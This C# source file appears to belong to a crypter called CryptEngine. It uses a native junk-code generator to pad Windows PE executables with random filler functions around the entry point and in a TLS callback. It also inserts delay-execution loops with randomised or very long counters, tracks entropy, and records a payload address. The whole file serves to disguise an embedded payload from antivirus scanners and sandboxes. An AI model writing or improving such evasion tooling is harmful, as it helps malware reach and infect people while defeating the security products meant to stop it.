using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

using CryptEngine.Cryptography;
using CryptEngine.Extensions;
using System.IO;
using System.Text.RegularExpressions;

using CryptEngine.NewPE;
using xNewPE = CryptEngine.NewPE.NewPE;
using System.Security.Cryptography;
using System.Diagnostics;

namespace CryptEngine.Constructors
{
    public struct XTG_MASK
    {
        public const int XMASK_FUNCTION = 0x1;
        public const int XMASK_LOGIC = 0x4;
        public const int XMASK_WINAPI = 0x2;
    }

    public struct XTG_TR_MASK
    {
        public const int XTG_FPU = 0x800;
    }

    public struct XTG_REGS
    {
        public static int XTG_EAX = 0x01;
        public static int XTG_ECX = 0x02;
        public static int XTG_EDX = 0x04;
        public static int XTG_EBX = 0x08;
        public static int XTG_ESP = 0x10;
        public static int XTG_EBP = 0x20;
        public static int XTG_ESI = 0x40;
        public static int XTG_EDI = 0x80;
    }

    public struct JunkCodeInfo
    {
        public int SIZE_PRE_EP_FUNCTIONS;
        public int SIZE_TLS_CALLBACK;
        public int SIZE_EP_FUNCTION;
        public int SIZE_POST_EP_FUNCTIONS;

        public int SIZE_DATA_ADDED;
        public int SIZE_ENTROPY_PAD;
    }

    public class JunkCodeConstructor
    {
        public const int IMAGE_BASE = 0x00400000;

        [DllImport("JunkGen.dll", EntryPoint = "GenJunk", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GenJunk(
            [MarshalAs(UnmanagedType.I4)]int MaxCodeSize,
            [MarshalAs(UnmanagedType.I4)]int CodeMask,
            [MarshalAs(UnmanagedType.I4)]int NeededRegisters,
            [MarshalAs(UnmanagedType.I4)]int bData,
            [MarshalAs(UnmanagedType.I4)]int DataAddr,
            [MarshalAs(UnmanagedType.I4)]int DataSize);

        [DllImport("JunkGen.dll", EntryPoint = "GenJunkFPU", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GenJunkFPU(
            [MarshalAs(UnmanagedType.I4)]int MaxCodeSize);

        [StructLayout(LayoutKind.Explicit)]
        private struct TrashStruct
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.I4)]
            public Int32 EntryPoint;

            [FieldOffset(4)]
            [MarshalAs(UnmanagedType.I4)]
            public Int32 CodeSize;

            [FieldOffset(8)]
            [MarshalAs(UnmanagedType.I4)]
            public Int32 DataAddr;
        }

        private static Random Rand = new Random(Guid.NewGuid().GetHashCode());

        public JunkCodeConstructor() { }

        private int ALIGN_UP(int x, int y)
        {
            return ((x + (y - 1)) & (~(y - 1)));
        }

        public void WriteLogicalFunctionsToTextSection(xNewPE PE, ref JunkCodeInfo JCI, int Multiplier)
        {
            string TxtSect = PE.PeDirectory.TextSectionPath.ReadText();

            int size_pre_ep = 0;
            int size_ep = 0;
            int size_post_ep = 0;

            int pre_ep_func_cnt = Rand.Next(5 * Multiplier, 10 * Multiplier);
            int post_ep_func_cnt = Rand.Next(5 * Multiplier, 10 * Multiplier);

            //   pre - ep
            for (int i = 0; i < pre_ep_func_cnt; i++)
            {
                int index_of = TxtSect.IndexOf(";[PRE_EP_FUNCTIONS]");
                if (index_of > -1)
                {
                    int func_len = Rand.Next(0x120, 0x200);

                    byte[] func_buffer;

                    if (Rand.NextDouble() >= 0.5)
                        func_buffer = new DataConstructor().GenData(func_len, func_len);
                    else
                        func_buffer = GenerateLogicalFunction(func_len, 0, 1, IMAGE_BASE + 0x1000, 0x100000);

                    // GenerateLogicalFunction(func_len, 0, 0, 0, 0);//GenerateLogicalFunction(func_len, 0, 1, IMAGE_BASE + 0x1000, 0x100000);
                    // Console.WriteLine("Entropy Func: {0}", calc_entropy(func_buffer));

                    // pad entropy with zeros after func
                    //int pad_len = Rand.Next(0x10, 0x25);
                    //Array.Resize(ref func_buffer, func_buffer.Length + pad_len);

                    TxtSect = TxtSect.Insert(index_of, func_buffer.ToASMBuffer() + Environment.NewLine);
                    size_pre_ep += func_buffer.Length;
                }
            }

            JCI.SIZE_PRE_EP_FUNCTIONS = size_pre_ep;

            // ep - 
            {
                int index_of = TxtSect.IndexOf(";[EP_FUNCTION]");
                if (index_of > -1)
                {
                    int func_len = Rand.Next(0x120, 0x140); // const
                    byte[] func_buffer = GenerateLogicalFunction(func_len, 0, 1, IMAGE_BASE + 0x1000, 0x100000);

                    // pad entropy with zeros after func
                    //int pad_len = Rand.Next(0x10, 0x25);
                    //Array.Resize(ref func_buffer, func_buffer.Length + pad_len);

                    TxtSect = TxtSect.Insert(index_of, func_buffer.ToASMBuffer() + Environment.NewLine);
                    size_ep += func_buffer.Length;
                }
            }

            JCI.SIZE_EP_FUNCTION = size_ep;

            ////  post - ep
            for (int i = 0; i < post_ep_func_cnt; i++)
            {
                int index_of = TxtSect.IndexOf(";[POST_EP_FUNCTIONS]");
                if (index_of > -1)
                {
                    int func_len = Rand.Next(0x120, 0x200);

                    byte[] func_buffer;

                    if (Rand.NextDouble() >= 0.5)
                        func_buffer = new DataConstructor().GenData(func_len, func_len);
                    else
                        func_buffer = GenerateLogicalFunction(func_len, 0, 1, IMAGE_BASE + 0x1000, 0x100000);
                    // Console.WriteLine("Entropy Func: {0}", calc_entropy(func_buffer));

                    // pad entropy with zeros after func
                    //int pad_len = Rand.Next(0x10, 0x25);
                    //Array.Resize(ref func_buffer, func_buffer.Length + pad_len);

                    TxtSect = TxtSect.Insert(index_of, func_buffer.ToASMBuffer() + Environment.NewLine);
                    size_post_ep += func_buffer.Length;
                }
            }

            JCI.SIZE_POST_EP_FUNCTIONS = size_post_ep;

            // PAD ENTROPY
            //int size_of_entropy_pad = 0x200; ;// ALIGN_UP(Rand.Next(0x200, 0x1000), (int)PE.NtHeader.OptionalHeader.FileAlignment);

            //byte[] zero_fill = new byte[0x1000];
            //string path_inc = Path.Combine(PE.PeDirectory.IncludeDirectory, "zerofill.bin");
            //path_inc.WriteFile(zero_fill);

            // JCI.SIZE_ENTROPY_PAD = (size_of_entropy_pad * 2);

            if (File.Exists(PE.PeDirectory.TextSectionPath))
                File.Delete(PE.PeDirectory.TextSectionPath);

            PE.PeDirectory.TextSectionPath.WriteText(TxtSect, StringEncoding.ASCII);

            GC.Collect();
        }

        public void WriteDelayExecutionTrash(xNewPE PE, bool bLong)
        {
            string[] olaf = PE.PeDirectory.DelayExecutionIncPath.ReadLines();

            byte[] trash_buffer;

            if (!bLong)
            {
                int len_trash = Rand.Next(0x100, 0x120);
                trash_buffer = GenerateLogicalTrash(len_trash, 0, 0, 0, 0);
            }
            else
            {
                int len_trash = Rand.Next(0x100, 0x120);
                trash_buffer = GenerateLogicalTrash(len_trash, 0, 0, 0, 0);
            }

            for (int i = 0; i < olaf.Length; i++)
            {
                if (olaf[i].Contains("0x69"))
                {
                    if (!bLong)
                        olaf[i] = olaf[i].Replace("0x69", string.Format("0x{0}", Rand.Next(25, 50).ToString("X8")));
                    else
                        olaf[i] = olaf[i].Replace("0x69", string.Format("0x{0}", Rand.Next(3500000 * 5, 6000000 * 5).ToString("X8")));
                }

                if (olaf[i].Contains(";[JUNK_NO_PRESERVE]"))
                {
                    if (!bLong)
                    {
                        olaf[i] = trash_buffer.ToASMBuffer();
                    }
                    else
                    {
                        olaf[i] = trash_buffer.ToASMBuffer();
                    }
                }
            }

            File.Delete(PE.PeDirectory.DelayExecutionIncPath);
            PE.PeDirectory.DelayExecutionIncPath.WriteLines(olaf);
        }

        long LongRandom(long min, long max)
        {
            byte[] buf = new byte[8];
            RandomNumberGenerator RNG = RandomNumberGenerator.Create();
            RNG.GetNonZeroBytes(buf);
            long longRand = BitConverter.ToInt64(buf, 0);
            return (Math.Abs(longRand % (max - min)) + min);
        }

        public void WriteLogicalTrashToTLSCallback(xNewPE PE, ref JunkCodeInfo JCI, int Multiplier)
        {
            string TlsCallbackInc = Path.Combine(PE.PeDirectory.IncludeDirectory, "tls_callback.inc");
            int sizeOfTLS = PEFactory.ComputeArbitrarySize(TlsCallbackInc, PE);
            int size_junk_added = 0;

            string[] tls = TlsCallbackInc.ReadLines();

            for (int i = 0; i < tls.Length; i++)
            {
                if (tls[i].Contains(";[JUNK_NO_PRESERVE]"))
                {
                    int len_trash = Rand.Next(0x100, 0x200);
                    byte[] trash_buffer = GenerateLogicalTrash(len_trash, 0, 0, 0, 0);
                    size_junk_added += trash_buffer.Length;

                    tls[i] = trash_buffer.ToASMBuffer();

                    trash_buffer = new byte[0];
                    GC.Collect();
                }

                if (tls[i].Contains(";[JUNK_FUNCS]"))
                {
                    int xx = Rand.Next(3 * Multiplier, 5 * Multiplier);

                    for (int jj = 0; jj < xx; jj++)
                    {
                        int func_len = Rand.Next(0x100, 0x120);
                        byte[] func_buffer = GenerateLogicalFunction(func_len, 0, 1, IMAGE_BASE + 0x1000, 0x1000);

                        tls[i] = string.Concat(tls[i], Environment.NewLine, func_buffer.ToASMBuffer(), Environment.NewLine);
                    }
                }

            }

            if (File.Exists(TlsCallbackInc))
                File.Delete(TlsCallbackInc);

            TlsCallbackInc.WriteLines(tls);

            sizeOfTLS = PEFactory.ComputeArbitrarySize(TlsCallbackInc, PE);
            JCI.SIZE_TLS_CALLBACK = sizeOfTLS + 3; // prologue;

            string AddrPayloadInc = Path.Combine(PE.PeDirectory.IncludeDirectory, "payload_address.inc");
            string Format = "PAYLOAD_ADDRESS EQU 0x{0}";
            Format = string.Format(Format, (JCI.SIZE_PRE_EP_FUNCTIONS + JCI.SIZE_TLS_CALLBACK + JCI.SIZE_EP_FUNCTION + JCI.SIZE_POST_EP_FUNCTIONS).ToString("X8"));
            File.WriteAllText(AddrPayloadInc, Format);

            GC.Collect();
        }

        public static double calc_entropy(byte[] b)
        {
            var map = new Dictionary<byte, int>();

            foreach (byte bb in b)
            {
                if (!map.ContainsKey(bb))
                    map.Add(bb, 1);
                else
                    map[bb]++;
            }

            double result = 0.0;
            int len = b.Length;
            foreach (var item in map)
            {
                var freq = (double)item.Value / len;
                result -= freq * (Math.Log(freq) / Math.Log(2));
            }

            return result;
        }

        private byte[] GenerateLogicalFunction(int MaxLength, int NeededRegisters, int bData, int DataAddress, int DataSize)
        {
            IntPtr pTrashStruct = GenJunk(MaxLength, XTG_MASK.XMASK_LOGIC + XTG_MASK.XMASK_FUNCTION, NeededRegisters, bData, DataAddress, DataSize);

            TrashStruct TStruct = (TrashStruct)Marshal.PtrToStructure(pTrashStruct, typeof(TrashStruct));

            IntPtr pEntryPoint = (IntPtr)TStruct.EntryPoint;
            IntPtr pData = (IntPtr)TStruct.DataAddr;

            byte[] pFunctionBuffer = new byte[TStruct.CodeSize];
            byte[] pDataBuffer = new byte[DataSize];

            try
            {
                Marshal.Copy(pEntryPoint, pFunctionBuffer, 0, TStruct.CodeSize);
            }
            catch (ArgumentNullException) { return null; }

            if (DataSize > 0)
            {
                try
                {
                    Marshal.Copy(pData, pDataBuffer, 0, DataSize);
                }
                catch (ArgumentNullException) { return null; }
            }

            return pFunctionBuffer;
        }

        private byte[] GenerateLogicalTrash(int MaxLength, int NeededRegisters, int bData, int DataAddress, int DataSize)
        {
            IntPtr pTrashStruct = GenJunk(MaxLength, 0, NeededRegisters, bData, DataAddress, DataSize);
            TrashStruct TStruct = (TrashStruct)Marshal.PtrToStructure(pTrashStruct, typeof(TrashStruct));

            IntPtr pEntryPoint = (IntPtr)TStruct.EntryPoint;

            byte[] pTrashCode = new byte[TStruct.CodeSize];
            Marshal.Copy(pEntryPoint, pTrashCode, 0, TStruct.CodeSize);

            return pTrashCode;
        }

        private byte[] GenerateFPUTrash(int MaxLength)
        {
            IntPtr pTrashStruct = GenJunkFPU(MaxLength);
            TrashStruct TStruct = (TrashStruct)Marshal.PtrToStructure(pTrashStruct, typeof(TrashStruct));

            IntPtr pEntryPoint = (IntPtr)TStruct.EntryPoint;

            byte[] pTrashCode = new byte[TStruct.CodeSize];
            Marshal.Copy(pEntryPoint, pTrashCode, 0, TStruct.CodeSize);

            return pTrashCode;
        }
    }
}
